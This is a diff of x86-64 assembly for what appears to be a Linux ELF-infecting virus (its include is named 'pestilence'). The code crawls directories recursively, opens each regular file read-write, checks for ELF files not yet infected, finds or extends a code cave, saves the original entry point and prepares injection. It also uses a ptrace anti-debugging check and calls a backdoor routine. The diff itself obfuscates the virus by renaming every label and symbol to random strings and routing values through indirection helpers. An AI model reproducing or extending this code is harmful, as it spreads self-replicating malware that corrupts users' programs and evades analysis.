@@ -1,86 +1,98 @@
-; %include "asm/srcs/obf_file.inc"
-%include "asm/srcs/pestilence.inc"
+%include "asm/srcs/obf_file.inc"
+; %include "asm/srcs/pestilence.inc"
 bits 64 
 default rel
 section .text
 global _start
 _start:
-    ; mov rbp, rsp
-	push rbp
-    mov rbp, rsp
-	PUSHA
-	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
-	; mov rsi, dir1Len
-	; call _readDir
-	call _map_int_table
-	call _check_debug
-    call _isInfectionAllow
-    test rax, rax
-    js _final_jmp
+; mov rbp, rsp
+push rbp
+mov rbp, rsp
+PUSHA
+; lea rdi, [rel LeqAx] ; dir to open for arg readDir
+; mov rsi, UsjUXZli1C
+; call LXQqhC
+call _map_int_table
+; call n0Zhf0
+call d7QXlhSKMh
+test rax, rax
+js ZCGAq
 push rax
-push  0
+push 0
 call mov2
 add rsp, 8
 mov rdx, rax
 pop rax
-    ;  dir to open for arg initDir
-    lea rdi, [rel dir1]                                   
-    ; mov rdi, dir1                                       ; dir to open for arg initDir
-    call _initDir
 push rax
-push  0
+push UsjUXZli1C
 call mov1
+add rsp, 8
+mov rsi, rax
+pop rax
+; dir to open for arg initDir
+lea rdi, [rel LeqAx] 
+; mov rdi, LeqAx ; dir to open for arg initDir
+call L6ny7j
+push rax
+push 0
+call mov4
 add rsp, 8
 mov rdx, rax
 pop rax
-    lea rdi, [rel dir2]
-    ; mov rdi, dir2                                       ; dir to open for arg initDir
-    call _initDir
-    call _backdoor
-    ; jmp _exit
-	_final_jmp:
-	POPA	
 push rax
-push  rbp
+push JksxN
 call mov3
+add rsp, 8
+mov rsi, rax
+pop rax
+lea rdi, [rel IU6f1]
+; mov rdi, IU6f1 ; dir to open for arg initDir
+call L6ny7j
+call fgHC3O2HCz
+; jmp lwmZqy
+ZCGAq:
+POPA 
+push rax
+push rbp
+call mov2
 add rsp, 8
 mov rsp, rax
 pop rax
-	pop rbp
-	_bf_exit:
-    jmp _exit
-_check_debug:
+pop rbp
+bzU1m8e:
+jmp lwmZqy
+n0Zhf0:
 push r15
 push r14
 movq r15, xmm15
 movzx r14, byte [r15 + 3]
 shl r14, 0x18
-push  r14
-call mov4
+push r14
+call mov1
 add rsp, 8
-movzx r14, byte [r15 + 127]
+movzx r14, byte [r15 + 119]
 shl r14, 0x10
-or  rax, r14 
-movzx r14, byte [r15 + 251]
+or rax, r14 
+movzx r14, byte [r15 + 235]
 shl r14, 0x8
-or  rax, r14 
-movzx r14, byte [r15 + 375]
-or  rax, r14 
+or rax, r14 
+movzx r14, byte [r15 + 351]
+or rax, r14 
 pop r14
 pop r15
-	syscall
-	push rax
+syscall
 push rax
-push  rax
-call mov2
+push rax
+push rax
+call mov4
 add rsp, 8
 mov rsi, rax
 pop rax
-push  SYS_PTRACE
-call mov4
+push SYS_PTRACE
+call mov3
 add rsp, 8
 push rax
-push  PTRACE_TRACEME
+push PTRACE_TRACEME
 call mov1
 add rsp, 8
 mov rdi, rax
@@ -91,19 +103,19 @@ movq r15, xmm15
 movzx r14, byte [r15 + 4]
 shl r14, 0x18
 push rax
-push  r14
-call mov3
+push r14
+call mov2
 add rsp, 8
 mov rdx, rax
 pop rax
-movzx r14, byte [r15 + 128]
+movzx r14, byte [r15 + 120]
 shl r14, 0x10
-or  rdx, r14 
-movzx r14, byte [r15 + 252]
+or rdx, r14 
+movzx r14, byte [r15 + 236]
 shl r14, 0x8
-or  rdx, r14 
-movzx r14, byte [r15 + 376]
-or  rdx, r14 
+or rdx, r14 
+movzx r14, byte [r15 + 352]
+or rdx, r14 
 pop r14
 pop r15
 push r15
@@ -112,37 +124,37 @@ movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
+push r14
 call mov3
 add rsp, 8
 mov r10, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  r10, r14 
-movzx r14, byte [r15 + 249]
+or r10, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  r10, r14 
-movzx r14, byte [r15 + 373]
-or  r10, r14 
+or r10, r14 
+movzx r14, byte [r15 + 349]
+or r10, r14 
 pop r14
 pop r15
-	syscall
+syscall
 cmp rax, 0 
-	jl _exit
-	pop rax
+jl lwmZqy
+pop rax
 push rax
-push  rax
-call mov2
+push rax
+call mov4
 add rsp, 8
 mov rsi, rax
 pop rax
-push  SYS_PTRACE
-call mov4
+push SYS_PTRACE
+call mov2
 add rsp, 8
 push rax
-push  PTRACE_DETACH
-call mov1
+push PTRACE_DETACH
+call mov4
 add rsp, 8
 mov rdi, rax
 pop rax
@@ -152,19 +164,19 @@ movq r15, xmm15
 movzx r14, byte [r15 + 4]
 shl r14, 0x18
 push rax
-push  r14
-call mov1
+push r14
+call mov3
 add rsp, 8
 mov rdx, rax
 pop rax
-movzx r14, byte [r15 + 128]
+movzx r14, byte [r15 + 120]
 shl r14, 0x10
-or  rdx, r14 
-movzx r14, byte [r15 + 252]
+or rdx, r14 
+movzx r14, byte [r15 + 236]
 shl r14, 0x8
-or  rdx, r14 
-movzx r14, byte [r15 + 376]
-or  rdx, r14 
+or rdx, r14 
+movzx r14, byte [r15 + 352]
+or rdx, r14 
 pop r14
 pop r15
 push r15
@@ -173,294 +185,315 @@ movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
-call mov3
+push r14
+call mov1
 add rsp, 8
 mov r10, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  r10, r14 
-movzx r14, byte [r15 + 249]
+or r10, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  r10, r14 
-movzx r14, byte [r15 + 373]
-or  r10, r14 
+or r10, r14 
+movzx r14, byte [r15 + 349]
+or r10, r14 
 pop r14
 pop r15
-	syscall
-	ret
-; take directory to open in rdi-> pwd
-_initDir:
-    ; placing pestilence on the stack
-    push rbp
-    mov rbp, rsp
-    sub rsp, pestilence_size
-	lea r8, FAM(pestilence.fd)
-	or qword [r8], -1
-    lea rsi, FAM(pestilence.pwd)
-    ;  strcpy(pestilence.pwd(rsi), pwd(rdi))
-    call _strcpy                                            
+syscall
+ret
+; take directory to open in rdi-> FDT9L
+L6ny7j:
+; placing JeUD6 on the stack
+push rbp
+mov rbp, rsp
+; rdi -> to _encrypt 
+push rax
+cy71VDeK:
+call _decrypt_str
+push rax
+push rax
+call mov3
+add rsp, 8
+mov rdi, rax
+pop rax
+pop rax
+sub rsp, JeUD6_size
+lea r8, FAM(JeUD6.rwpA8dhMq)
+or qword [r8], -1
+lea rsi, FAM(JeUD6.FDT9L)
+; strcpy(JeUD6.FDT9L(rsi), FDT9L(rdi))
+call HOmW8jN 
 cmp rdx, 0 
-    je _readDir
-    ;  strlen(pestilence.pwd(rsi))
-    call _strlen                                            
+je LXQqhC
+; strlen(JeUD6.FDT9L(rsi))
+call lzPBWI0L 
 push rax
 push rsi
-push  rax
+push rax
 call add1
 add rsp, 8
 pop rsi
 mov rsi, rax
 pop rax
 cmp BYTE [rsi - 1], '/' 
-    je _join
+je Gvdssm
 mov BYTE [rsi], '/' 
 push rax
 push rsi
-push  1
+push 1
 call add1
 add rsp, 8
 pop rsi
 mov rsi, rax
 pop rax
-    _join:
+Gvdssm:
 push rax
-push  rdx
-call mov4
+push rdx
+call mov1
 add rsp, 8
 mov rdi, rax
 pop rax
-    call _strcpy
-    mov rdi, rsp
-_readDir:
-push  SYS_OPEN
-call mov2
+call HOmW8jN
+mov rdi, rsp
+LXQqhC:
+push SYS_OPEN
+call mov4
 add rsp, 8
 push rax
-push  O_RDONLY | O_DIRECTORY
-call mov1
+push O_RDONLY | O_DIRECTORY
+call mov2
 add rsp, 8
 mov rsi, rax
 pop rax
-    xor rdx, rdx
-    syscall
+xor rdx, rdx
+syscall
 cmp rax, 0 
-    jl _returnClose
-    ;  en registre le fd dans la struct
-    lea rdi, FAM(pestilence.fd)                             
+jl Tqb1Kg1IBU
+; en registre le rwpA8dhMq dans la struct
+lea rdi, FAM(JeUD6.rwpA8dhMq) 
 push rax
-push  rax
-call mov3
+push rax
+call mov1
 add rsp, 8
 mov [rdi], rax
 pop rax
-    _getDents:
-        lea r10, FAM(pestilence.fd) 
-        ;  init total_read
-        lea r9, FAM(pestilence.total_read)                  
+reKBo:
+lea r10, FAM(JeUD6.rwpA8dhMq) 
+; init iWNXUwokn
+lea r9, FAM(JeUD6.iWNXUwokn) 
 mov DWORD [r9], 0 
-push  SYS_GETDENTS
+push SYS_GETDENTS
 call mov4
 add rsp, 8
 push rax
-push  qword [r10]
-call mov2
+push qword [r10]
+call mov3
 add rsp, 8
 mov rdi, rax
 pop rax
-        lea rsi, FAM(pestilence.dirents)
+lea rsi, FAM(JeUD6.G47ZqV)
 push rax
-push  PAGE_SIZE
+push PAGE_SIZE
 call mov2
 add rsp, 8
 mov rdx, rax
 pop rax
-        syscall
+syscall
 cmp rax, 0 
-        jle _returnClose
-    ;  r10 -> (struct pestilence.diretents_struct_ptr)
-    lea r10, FAM(pestilence.dirents_struct_ptr) 			
-    ;  pestilence.dirents_struct_ptr -> pestilence.dirents
+jle Tqb1Kg1IBU
+; r10 -> (struct JeUD6.diretents_struct_ptr)
+lea r10, FAM(JeUD6.mvJ2G0B) 
+; JeUD6.mvJ2G0B -> JeUD6.G47ZqV
 push rax
-push  rsi
-call mov3
+push rsi
+call mov4
 add rsp, 8
 mov [r10], rax
 pop rax
-    ;  r11 -> (struct pestilence.total_to_read)
-    lea r11, FAM(pestilence.total_to_read)      			
+; r11 -> (struct JeUD6.mY2fujeRo)
+lea r11, FAM(JeUD6.mY2fujeRo) 
 mov DWORD [r11], eax 
-    _listFile:
-        ;  r8 -> total lu de getdents
-        lea r8, FAM(pestilence.total_read)      			
-        ;  r9 -> total a lire de getdents
-        lea r9, FAM(pestilence.total_to_read)       		
-        ;  r10 -> actual dirent struct
-        mov r10, FAM(pestilence.dirents_struct_ptr) 		
-        ;  r11 -> ptr de la struct actuelle
-        lea r11, FAM(pestilence.dirents_struct_ptr) 		
+irj9h:
+; r8 -> total lu de getdents
+lea r8, FAM(JeUD6.iWNXUwokn) 
+; r9 -> total a lire de getdents
+lea r9, FAM(JeUD6.mY2fujeRo) 
+; r10 -> actual dirent struct
+mov r10, FAM(JeUD6.mvJ2G0B) 
+; r11 -> ptr de la struct actuelle
+lea r11, FAM(JeUD6.mvJ2G0B) 
 movzx r12, WORD [r10 + D_RECLEN_OFF] 
-        ;  update du total lu dans r8
-        add [r8], r12d                        			
-        ;  pestilence.diretns_struct_ptr -> sur la prochaine struct
-        add qword [r11], r12                          		
+; update du total lu dans r8
+add [r8], r12d 
+; JeUD6.diretns_struct_ptr -> sur la prochaine struct
+add qword [r11], r12 
 cmp BYTE [r10 + D_TYPE], D_FOLDER 
-        je _recursif
+je TLLLXxoxM
 cmp BYTE [r10 + D_TYPE], D_REG_FILE 
-        jne _checkRead
-        _updatePath:
-            ; strlen
-            mov rsi,  rsp
-            call _strlen
+jne KpHnLUufhQ
+wgYQw:
+; strlen
+mov rsi, rsp
+call lzPBWI0L
 lea rsi, [r10 + D_NAME] 
-            mov byte [rsi - 1], '/'
+mov byte [rsi - 1], '/'
 push rax
-push  1
+push 1
 call add1
 add rsp, 8
 add rsp, 8
-            sub rsi, rax
-            mov rdi, rsp
-            call _strcpyNoNull
-            ; printing
-            ; writeWork
-            ; writeBack
-            ; ajouter les foncton pour chaques fichier ici
-            ; call _open_file
-			call _check_file
-            jmp _checkRead
-            _recursif:
-                lea rdi, FAM(pestilence.pwd)
+sub rsi, rax
+mov rdi, rsp
+call f95ZQpA3
+; printing
+; writeWork
+; writeBack
+; ajouter les foncton pour chaques fichier ici
+; call qDbesJ
+call afAbq2f
+jmp KpHnLUufhQ
+TLLLXxoxM:
+lea rdi, FAM(JeUD6.FDT9L)
+push rax
+lea rsi, FAM(JeUD6.FDT9L)
+call lzPBWI0L
+push rax
+push rax
+call mov2
+add rsp, 8
+mov rsi, rax
+pop rax
+pop rax
 lea rdx, [r10 + D_NAME] 
 cmp BYTE [rdx], 0x2e 
-                jne _callInit
+jne pdUHG5LeX
 cmp BYTE [rdx + 1], 0 
-                je _checkRead
+je KpHnLUufhQ
 cmp BYTE [rdx + 1], 0x2e 
-                jne _callInit
+jne pdUHG5LeX
 cmp BYTE [rdx + 2], 0 
-                je _checkRead
-                _callInit:
-                    call _initDir
-            _checkRead:
-                mov r8, FAM(pestilence.total_read)
-                mov r12, FAM(pestilence.total_to_read)
-                ;  if (total lu >= total getdents)
-                cmp r8d, r12d                 			
-                jge _getDents
-                jmp _listFile
-    _returnClose:
-		mov rdi, FAM(pestilence.fd)
+je KpHnLUufhQ
+pdUHG5LeX:
+call L6ny7j
+KpHnLUufhQ:
+mov r8, FAM(JeUD6.iWNXUwokn)
+mov r12, FAM(JeUD6.mY2fujeRo)
+; if (total lu >= total getdents)
+cmp r8d, r12d 
+jge reKBo
+jmp irj9h
+Tqb1Kg1IBU:
+mov rdi, FAM(JeUD6.rwpA8dhMq)
 cmp qword rdi, 0 
-		jle	_returnLeave
-push  SYS_CLOSE
-call mov1
+jle aOvfi3N4
+push SYS_CLOSE
+call mov3
 add rsp, 8
-		syscall
-		or qword FAM(pestilence.fd), -1
-		jmp _returnLeave
-        ; mov rdi, FAM(pestilence.fd)
-        ; syscall
-_returnLeave:
-    leave
-_return:
-    ret
-_check_file:
-	push rbp
-	mov	rbp, rsp
-	sub rsp, infection_size
-	lea rax, INF(infection.injection_offset)
+syscall
+or qword FAM(JeUD6.rwpA8dhMq), -1
+jmp aOvfi3N4
+; mov rdi, FAM(JeUD6.rwpA8dhMq)
+; syscall
+aOvfi3N4:
+leave
+Yn887ponP:
+ret
+afAbq2f:
+push rbp
+mov rbp, rsp
+sub rsp, X703hy1rZ_size
+lea rax, INF(X703hy1rZ.F4vJxi7)
 mov qword [rax], 0 
-	lea rax, INF(infection.add_page)
+lea rax, INF(X703hy1rZ.GkEOkKIOr)
 mov byte [rax], 0 
-	lea rax, INF(infection.mem_eof)
+lea rax, INF(X703hy1rZ.gyLo4iIdVn)
 mov qword [rax], 0 
-	_open_file:
-push  SYS_OPEN
-call mov4
+qDbesJ:
+push SYS_OPEN
+call mov1
 add rsp, 8
 push rax
-push  rsi
-call mov2
+push rsi
+call mov4
 add rsp, 8
 mov rdi, rax
 pop rax
 push rax
-push  O_RDWR
-call mov4
+push O_RDWR
+call mov2
 add rsp, 8
 mov rsi, rax
 pop rax
-		xor rdx, rdx
-		syscall
+xor rdx, rdx
+syscall
 cmp rax, 0x0 
-		jl	_returnLeave
+jl aOvfi3N4
 push rax
-push  rax
-call mov3
-add rsp, 8
-mov INF(infection.file_fd), rax
-pop rax
-	; === get file size ===
-	_get_filesz:
-push  SYS_LSEEK
+push rax
 call mov1
 add rsp, 8
-		mov	rdi, INF(infection.file_fd)
+mov INF(X703hy1rZ.qz9giR), rax
+pop rax
+; === get file size ===
+uKUAgDiB9:
+push SYS_LSEEK
+call mov3
+add rsp, 8
+mov rdi, INF(X703hy1rZ.qz9giR)
 push r15
 push r14
 movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
-call mov2
+push r14
+call mov1
 add rsp, 8
 mov rsi, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  rsi, r14 
-movzx r14, byte [r15 + 249]
+or rsi, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  rsi, r14 
-movzx r14, byte [r15 + 373]
-or  rsi, r14 
+or rsi, r14 
+movzx r14, byte [r15 + 349]
+or rsi, r14 
 pop r14
 pop r15
 push rax
-push  SEEK_END
+push SEEK_END
 call mov4
 add rsp, 8
 mov rdx, rax
 pop rax
-		syscall
+syscall
 cmp rax, 0x0 
-		jle _close_file_inf
+jle vNfN5Ue
 push rax
-push  rax
+push rax
+call mov2
+add rsp, 8
+mov INF(X703hy1rZ.nGwh0I24), rax
+pop rax
+push rax
+push rax
 call mov3
 add rsp, 8
-mov INF(infection.map_size), rax
+mov INF(X703hy1rZ.qLMmjsLc), rax
 pop rax
+FEnTgqIwBZ:
+; rax -> map
+; rsi = file_size
 push rax
-push  rax
-call mov1
-add rsp, 8
-mov INF(infection.original_end), rax
-pop rax
-	_map_file:
-	; rax	-> map
-		;  rsi = file_size
 push rax
-push  rax
-call mov2
+call mov4
 add rsp, 8
 mov rsi, rax
 pop rax
-push  SYS_MMAP
-call mov4
+push SYS_MMAP
+call mov3
 add rsp, 8
 push r15
 push r14
@@ -468,230 +501,230 @@ movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
-call mov1
+push r14
+call mov2
 add rsp, 8
 mov rdi, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  rdi, r14 
-movzx r14, byte [r15 + 249]
+or rdi, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  rdi, r14 
-movzx r14, byte [r15 + 373]
-or  rdi, r14 
+or rdi, r14 
+movzx r14, byte [r15 + 349]
+or rdi, r14 
 pop r14
 pop r15
 push rax
-push  PROT_READ | PROT_WRITE | PROT_EXEC
-call mov3
+push PROT_READ | PROT_WRITE | PROT_EXEC
+call mov1
 add rsp, 8
 mov rdx, rax
 pop rax
 push rax
-push  MAP_SHARED
-call mov1
+push MAP_SHARED
+call mov3
 add rsp, 8
 mov r10, rax
 pop rax
-		mov r8, INF(infection.file_fd)
+mov r8, INF(X703hy1rZ.qz9giR)
 push r15
 push r14
 movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
+push r14
 call mov4
 add rsp, 8
 mov r9, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  r9, r14 
-movzx r14, byte [r15 + 249]
+or r9, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  r9, r14 
-movzx r14, byte [r15 + 373]
-or  r9, r14 
+or r9, r14 
+movzx r14, byte [r15 + 349]
+or r9, r14 
 pop r14
 pop r15
-		syscall
+syscall
 cmp rax, 0x0 
-		jl _close_file_inf
-		call _extractData
-push  r12
+jl vNfN5Ue
+call hLpiGpf
+push r12
 call mov2
 add rsp, 8
 push rax
-push  r15
-call mov3
+push r15
+call mov1
 add rsp, 8
 mov rsi, rax
 pop rax
-		lea r8, INF(infection.map_addr)
+lea r8, INF(X703hy1rZ.jS6sH4kx)
 push rax
-push  rax
-call mov4
+push rax
+call mov2
 add rsp, 8
 mov [r8], rax
 pop rax
-	_check_format:
+Sswbkbk3U:
 cmp dword [rax + 1], 0x02464c45 
-		jne _unmap_close_inf
-	_check_already_infected:
-	; rax	== total segment number
-	; r9	== injection offset
-	; r13	== original segment end offset
-	; r14	-> header table
-	; r15	-> map
+jne jc6dsjkGsi
+NraI00tKE:
+; rax == total segment number
+; r9 == injection offset
+; r13 == original segment end offset
+; r14 -> header table
+; r15 -> map
 push rax
-push  rax
-call mov1
+push rax
+call mov4
 add rsp, 8
 mov r15, rax
 pop rax
 push rax
-push  r15
+push r15
 call mov3
 add rsp, 8
 mov r14, rax
 pop rax
 push rax
 push r14
-push  qword [r14 + elf64_ehdr.e_phoff]
+push qword [r14 + w0adOh4j9A.WC98s6]
 call add1
 add rsp, 8
 pop r14
 mov r14, rax
 pop rax
-		xor rcx, rcx
-		_go_to_last_segment:
-			cmp cx, [r15  + elf64_ehdr.e_phnum]
-			jge _go_to_last_segment_end	
+xor rcx, rcx
+hp1qWtj4bm:
+cmp cx, [r15 + w0adOh4j9A.sqnXrEEphp]
+jge g9SQfLm 
 push rax
 push r14
-push  elf64_phdr_size
+push l8FG12Pyo_size
 call add1
 add rsp, 8
 pop r14
 mov r14, rax
 pop rax
-			inc rcx
-			jmp _go_to_last_segment
-		_go_to_last_segment_end:
+inc rcx
+jmp hp1qWtj4bm
+g9SQfLm:
 push rax
-push  r14
-call mov2
+push r14
+call mov1
 add rsp, 8
-mov INF(infection.last_seg_hdr_addr), rax
+mov INF(X703hy1rZ.xjReXh), rax
 pop rax
-		xor r9, r9
-		_segment_loop:
+xor r9, r9
+eykMn3h:
 cmp cx, 0 
-			jle	_segment_loop_end
-			_check_segment_format:
+jle Qo8Nc9
+rfQICHso6T:
 bt word [r14], 0 
-				jnc _continue
+jnc eccDm
 bt qword [r14], 0x20 
-				jc _handle_valid_segment
-			_continue:
-				dec rcx
-				sub r14, elf64_phdr_size
-				jmp _segment_loop
-		_segment_loop_end:
-			mov r9, INF(infection.injection_offset)
+jc wy4ldfvHIv
+eccDm:
+dec rcx
+sub r14, l8FG12Pyo_size
+jmp eykMn3h
+Qo8Nc9:
+mov r9, INF(X703hy1rZ.F4vJxi7)
 cmp r9, 0 
-			je _unmap_close_inf
-cmp byte INF(infection.add_page), 1 
-			je _add_page
-			;  else jmp _infection
-			jmp _infection										
-		_handle_valid_segment:
-		; Check if the segment signed, else check the size, if big enough save the offsets if not already done
-			_check_signature:
-			; r8	-> potential signature
-			; r9	== signature variable
+je jc6dsjkGsi
+cmp byte INF(X703hy1rZ.GkEOkKIOr), 1 
+je ZYFHesE
+; else jmp faawz
+jmp faawz 
+wy4ldfvHIv:
+; Check if the segment signed, else check the size, if big enough save the offsets if not already done
+wxMR1:
+; r8 -> potential haXw6ThsV
+; r9 == haXw6ThsV variable
 push rax
-push  r15
-call mov2
-add rsp, 8
-mov r8, rax
-pop rax
-push rax
-push r8
-push  qword [r14 + elf64_phdr.p_offset]
-call add1
-add rsp, 8
-pop r8
-mov r8, rax
-pop rax
-push rax
-push r8
-push  qword [r14 + elf64_phdr.p_filesz]
-call add1
-add rsp, 8
-pop r8
-mov r8, rax
-pop rax
-				sub r8, signature_len
-push rax
-push  qword [rel signature]
+push r15
 call mov4
+add rsp, 8
+mov r8, rax
+pop rax
+push rax
+push r8
+push qword [r14 + l8FG12Pyo.IjAqzlaXw]
+call add1
+add rsp, 8
+pop r8
+mov r8, rax
+pop rax
+push rax
+push r8
+push qword [r14 + l8FG12Pyo.tnsaLRfc]
+call add1
+add rsp, 8
+pop r8
+mov r8, rax
+pop rax
+sub r8, ENiCO4ir
+push rax
+push qword [rel haXw6ThsV]
+call mov2
 add rsp, 8
 mov r9, rax
 pop rax
-				cmp qword r9, [r8]
-				je _unmap_close_inf
-			_valid_seg_already_found:
-				mov r9, INF(infection.injection_offset)
-				test r9, r9
-				jz _check_cave_size
-				mov r9, INF(infection.add_page)
-				test r9, r9
-				jz _continue
-			_check_cave_size:
-			; r8	== end of infection offset
-			; r9	== next segment offset
+cmp qword r9, [r8]
+je jc6dsjkGsi
+YXYU3:
+mov r9, INF(X703hy1rZ.F4vJxi7)
+test r9, r9
+jz l2abMqvAOq
+mov r9, INF(X703hy1rZ.GkEOkKIOr)
+test r9, r9
+jz eccDm
+l2abMqvAOq:
+; r8 == end of X703hy1rZ offset
+; r9 == next segment offset
 push rax
-push  qword [r14 + elf64_phdr.p_offset]
-call mov3
+push qword [r14 + l8FG12Pyo.IjAqzlaXw]
+call mov1
 add rsp, 8
 mov r8, rax
 pop rax
 push rax
 push r8
-push  qword [r14 + elf64_phdr.p_filesz]
+push qword [r14 + l8FG12Pyo.tnsaLRfc]
 call add1
 add rsp, 8
 pop r8
 mov r8, rax
 pop rax
-				;  save segment end's offset
+; save segment end's offset
 push rax
-push  r8
-call mov1
+push r8
+call mov3
 add rsp, 8
 mov r13, rax
 pop rax
 push rax
 push r8
-push  CODE_LEN
+push CODE_LEN
 call add1
 add rsp, 8
 pop r8
 mov r8, rax
 pop rax
 push rax
-push  r14
+push r14
 call mov4
 add rsp, 8
 mov r9, rax
 pop rax
 push rax
 push r9
-push  elf64_phdr_size
+push l8FG12Pyo_size
 call add1
 add rsp, 8
 pop r9
@@ -699,103 +732,103 @@ mov r9, rax
 pop rax
 push rax
 push r9
-push  elf64_phdr.p_offset
+push l8FG12Pyo.IjAqzlaXw
 call add1
 add rsp, 8
 pop r9
 mov r9, rax
 pop rax
-				cmp [r9], r8
-				;  if ([r9] < r8) { infection.add_page = 1) }
-				setb INF(infection.add_page)			
-			_save_offsets:
-			; r8	-> infection structure members
-			; r9	== injection address
-			; r12	== original entrypoint
-			;*r13	== segment end's offset (_check_cave_size)
-			;*r14	-> segment header in header table
-				lea r8, INF(infection.seg_nb)
-				mov [r8], cl
-				lea r8, INF(infection.original_entry)
+cmp [r9], r8
+; if ([r9] < r8) { X703hy1rZ.GkEOkKIOr = 1) }
+setb INF(X703hy1rZ.GkEOkKIOr) 
+mS8FiYQsFg:
+; r8 -> X703hy1rZ structure members
+; r9 == injection address
+; r12 == original entrypoint
+;*r13 == segment end's offset (l2abMqvAOq)
+;*r14 -> segment header in header table
+lea r8, INF(X703hy1rZ.J8JLc)
+mov [r8], cl
+lea r8, INF(X703hy1rZ.zsfLTcza)
 push rax
-push  qword [r15 + elf64_ehdr.e_entry]
-call mov3
+push qword [r15 + w0adOh4j9A.bmF8Q2]
+call mov1
 add rsp, 8
 mov r12, rax
 pop rax
 push rax
-push  r12
+push r12
+call mov3
+add rsp, 8
+mov [r8], rax
+pop rax
+lea r8, INF(X703hy1rZ.F4vJxi7)
+push rax
+push r13
 call mov2
 add rsp, 8
 mov [r8], rax
 pop rax
-				lea r8, INF(infection.injection_offset)
+lea r8, INF(X703hy1rZ.rM6Aog)
+push r9
 push rax
-push  r13
-call mov1
-add rsp, 8
-mov [r8], rax
-pop rax
-				lea	r8, INF(infection.injection_addr)
-				push r9
-push rax
-push  qword [r14 + elf64_phdr.p_vaddr]
+push qword [r14 + l8FG12Pyo.Sol8RvYWh]
 call mov3
 add rsp, 8
 mov r9, rax
 pop rax
 push rax
 push r9
-push  qword [r14 + elf64_phdr.p_memsz]
+push qword [r14 + l8FG12Pyo.Ei8V6]
 call add1
 add rsp, 8
 pop r9
 mov r9, rax
 pop rax
 push rax
-push  r9
-call mov4
-add rsp, 8
-mov [r8], rax
-pop rax
-				pop r9
-				lea r8, INF(infection.seg_hdr_addr)
-push rax
-push  r14
+push r9
 call mov1
 add rsp, 8
 mov [r8], rax
 pop rax
-				jmp _continue
-_add_page:
-	_update_file_size:
-push  SYS_FTRUNCATE
+pop r9
+lea r8, INF(X703hy1rZ.WVWWfydEhR)
+push rax
+push r14
+call mov4
+add rsp, 8
+mov [r8], rax
+pop rax
+jmp eccDm
+ZYFHesE:
+tJ3Qpqu:
+push SYS_FTRUNCATE
 call mov2
 add rsp, 8
-		mov rdi, INF(infection.file_fd)
-		lea rsi, INF(infection.map_size)
-		push qword [rsi]
+mov rdi, INF(X703hy1rZ.qz9giR)
+lea rsi, INF(X703hy1rZ.nGwh0I24)
+push qword [rsi]
 add qword [rsi], PAGE_SIZE 
-		and qword [rsi], -4096
+and qword [rsi], -4096
 add qword [rsi], CODE_LEN 
 push rax
-push  qword [rsi]
-call mov3
+push qword [rsi]
+call mov4
 add rsp, 8
 mov rsi, rax
 pop rax
-		syscall
-		pop rsi
+syscall
+pop rsi
 cmp rax, 0 
-		jl _unmap_close_inf
-	_unmap_prev_map:
-		mov rdi, INF(infection.map_addr)
-push  SYS_UNMAP
-call mov2
+jl jc6dsjkGsi
+D2fR4tdpaq:
+mov rdi, INF(X703hy1rZ.jS6sH4kx)
+push SYS_UNMAP
+call mov3
 add rsp, 8
-		syscall
-	_remap_file:
-push  SYS_MMAP
+syscall
+zPTzub:
+push SYS_MMAP
 call mov1
 add rsp, 8
 push r15
@@ -804,247 +837,247 @@ movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
-call mov4
+push r14
+call mov2
 add rsp, 8
 mov rdi, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  rdi, r14 
-movzx r14, byte [r15 + 249]
+or rdi, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  rdi, r14 
-movzx r14, byte [r15 + 373]
-or  rdi, r14 
+or rdi, r14 
+movzx r14, byte [r15 + 349]
+or rdi, r14 
 pop r14
 pop r15
-		;  rsi = file_size
-		mov rsi, INF(infection.map_size)				
+; rsi = file_size
+mov rsi, INF(X703hy1rZ.nGwh0I24) 
 push rax
-push  PROT_READ | PROT_WRITE | PROT_EXEC
-call mov4
+push PROT_READ | PROT_WRITE | PROT_EXEC
+call mov2
 add rsp, 8
 mov rdx, rax
 pop rax
 push rax
-push  MAP_SHARED
-call mov2
+push MAP_SHARED
+call mov4
 add rsp, 8
 mov r10, rax
 pop rax
-		mov r8, INF(infection.file_fd)
+mov r8, INF(X703hy1rZ.qz9giR)
 push r15
 push r14
 movq r15, xmm15
 movzx r14, byte [r15 + 1]
 shl r14, 0x18
 push rax
-push  r14
-call mov1
+push r14
+call mov3
 add rsp, 8
 mov r9, rax
 pop rax
-movzx r14, byte [r15 + 125]
+movzx r14, byte [r15 + 117]
 shl r14, 0x10
-or  r9, r14 
-movzx r14, byte [r15 + 249]
+or r9, r14 
+movzx r14, byte [r15 + 233]
 shl r14, 0x8
-or  r9, r14 
-movzx r14, byte [r15 + 373]
-or  r9, r14 
+or r9, r14 
+movzx r14, byte [r15 + 349]
+or r9, r14 
 pop r14
 pop r15
-		syscall
+syscall
 cmp rax, 0x0 
-		jl _close_file_inf
-		lea r8, INF(infection.map_addr)
+jl vNfN5Ue
+lea r8, INF(X703hy1rZ.jS6sH4kx)
 push rax
-push  rax
-call mov3
+push rax
+call mov1
 add rsp, 8
 mov [r8], rax
 pop rax
